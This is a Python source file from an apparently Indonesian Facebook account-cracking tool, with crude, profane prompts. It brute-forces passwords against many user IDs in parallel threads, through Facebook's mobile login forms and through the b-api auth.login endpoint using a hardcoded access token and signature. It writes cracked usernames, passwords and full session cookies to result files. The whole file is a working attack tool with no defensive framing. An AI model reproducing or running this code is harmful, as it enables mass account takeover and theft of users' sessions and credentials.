# hallo bro :v

#from wibu.YNTKTS import *
from modul import *
from .useragent import uwa
from .list_pass import pw_list
import concurrent.futures
import urllib.request

ok,cp,cout,live,chek=0,0,0,[],[]

class crack:
	def __init__(self,url,user):
		
		print("")
		self.url=url
		self.user=user
		self.naroskeun()

	def naroskeun(self):
		NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
		while NAROSKEUN in (""," "):
			print(" ! jangan kosong ngentod")
			NAROSKEUN=input(" ? ingin menggunakan password manual Y/T : ")
		if NAROSKEUN in tuple("yY"):
			print(" * contoh : nama123,nama12345,sayang")
			password=input(" ? set password : ")
			while len(password) < 6:
				print(" ! jangan kosong ngentod" if password in (""," ") else " ! password minimal 6 karakter")
				password=input(" ? set password : ")
			print(" * pilih method crack")
			print(" 1. method b-api (fast crack)")
			print(" 2. method free.facebook (slow crack)" if "free.facebook" in self.url else " 2. method mbasic (slow crack)")
			self.awokawok_ngentod(password.split(","))
		if NAROSKEUN in tuple("tT"):
			print(" * pilih method crack")
			print(" 1. method b-api (fast crack)")
			print(" 2. method free.facebook (slow crack)" if "free.facebook" in self.url else " 2. method mbasic (slow crack)")
			self.awokawok_ngentod()
		else:
			print(" ! isi yang bener ngentod");self.naroskeun()
			
	def awokawok_ngentod(self,p_asw=None):
		pilih=input(" ? pilih : ")
		while pilih in (""," "):
			print(" ! jangan kosong ngentod")
			pilih=input(" ? pilih : ")
		if pilih in ("1","01"):
			workers=50 if p_asw is None else 30
			self.awokawok_njir(self.api,workers,p_asw)
			self.result()
		if pilih in ("2","02"):
			workers=50 if p_asw is None else 30
			self.awokawok_njir(self.facebook,workers,p_asw)
			self.result()
		else:
			print(" ! isi yang bener ngentod");self.awokawok_ngentod(p_asw)
					
	def awokawok_njir(self,ntahlah,kecepatan,wokwok=None):
		print(" * crack started\n * ctrl+z to stop\n")
		with concurrent.futures.ThreadPoolExecutor(max_workers=kecepatan) as asw_lo:
			for xnxx in self.user:
				xvideos=xnxx.split("(Aap Gans)")
				if wokwok is None: asw_lo.submit(ntahlah,xvideos[0],pw_list(xvideos))
				else: asw_lo.submit(ntahlah,xvideos[0],wokwok)
					
	def facebook(self,username,list_password,**awok):
		global ok,cp,cout
		for password in list_password:
			ses=req.session()
			try: respon=ses.get(f"{self.url}/login/?next&ref=dbl&refid=8").text
			except koneksi_error: self.facebook(username,list_password)
			awok.update({x["name"]:x["value"] for x in parser(respon,"html.parser").find_all("input",{"value":True})})
			if "sign_up" in awok and "_fb_noscript" in awok:
				del awok["sign_up"]
				del awok["_fb_noscript"]
			awok.update({"email":username,"pass":password})
			ses.headers.update({"Host":self.url.split("//")[1],"upgrade-insecure-requests":"1","cache-control":"max-age=0","content-type":"application/x-www-form-urlencoded","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","referer":f"{self.url}/login/?next&ref=dbl&fl&refid=8","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","user-agent":uwa})
			action=parser(respon,"html.parser").find("form",{"method":"post"})["action"]
			try: ses.post(self.url+action,data=awok,allow_redirects=False)
			except koneksi_error: self.facebook(username,list_password)
			cookie=ses.cookies.get_dict()
			if "c_user" in cookie:
				ok+=1
				cookies=";".join([_+"="+__ for _,__ in cookie.items()])
				self.save(f" \x1b[1;32m*--> {cookie['c_user']}|{password}|{cookies}","result/live.txt",live)
				break
			elif "checkpoint" in cookie:
				cp+=1
				uid=json.loads(urllib.request.unquote(cookie["checkpoint"]))["u"]
				self.save(f" \x1b[1;33m*--> {uid}|{password}","result/chek.txt",chek)
				break
			else: continue
		cout+=1
		print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")
		
	def api(self,username,list_password):
		global ok,cp,cout
		for password in list_password:
			try: respon=req.get("https://b-api.facebook.com/method/auth.login",params={"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format":"JSON","sdk_version":"2","email":username,"locale":"en_US","password":password,"sdk":"ios","generate_session_cookies":"1","sig":"3f555f99fb61fcd7aa0c44f58f522ef6"})
			except koneksi_error: self.api(username,list_password)
			if "session_key" in respon.text and "EAAA" in respon.text:
				ok+=1
				self.save(f" \x1b[1;32m*--> {username}|{password}","result/live.txt",live)
				break
			if "www.facebook.com" in respon.json()["error_msg"]:
				cp+=1
				self.save(f" \x1b[1;33m*--> {username}|{password}","result/chek.txt",chek)
				break
			else: continue
		cout+=1
		print(f"\r * crack {cout}/{len(self.user)} ok:-{ok} cp:-{cp}",end="")

	def save(self,*args):
		print(f"\r{args[0]}\x1b[0m\n",end="")
		lol=re.findall("> (.+)",args[0])[0]
		open(args[1],"a").write(lol+"\n")
		args[2].append(lol)

	def result(self):
		if len(live)!=0 or len(chek)!=0:
			print(f"\n\n * done gan\n * live/chek : {len(live)}/{len(chek)}")
			if len(live)!=0: print(" * hasil live tersimpan di file : result/live.txt")
			if len(chek)!=0: print(" * hasil chek tersimpan di file : result/chek.txt")
			exit()
		else: exit("\n\n ! tidak mendapatkan hasil")